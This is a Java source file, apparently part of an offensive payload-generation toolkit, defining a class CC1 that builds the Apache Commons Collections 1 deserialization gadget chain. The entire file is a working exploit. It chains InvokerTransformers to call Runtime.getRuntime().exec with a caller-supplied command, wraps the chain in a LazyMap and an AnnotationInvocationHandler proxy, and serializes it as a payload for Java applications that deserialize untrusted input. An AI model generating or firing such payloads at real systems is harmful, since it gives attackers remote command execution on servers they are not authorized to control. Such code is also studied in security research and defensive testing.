package cn.safe6.payload.shortPayload.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseCommand(String cmd) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),
                    LazyMap.class.getInterfaces(), handler);
            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
            return serialize(handler1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
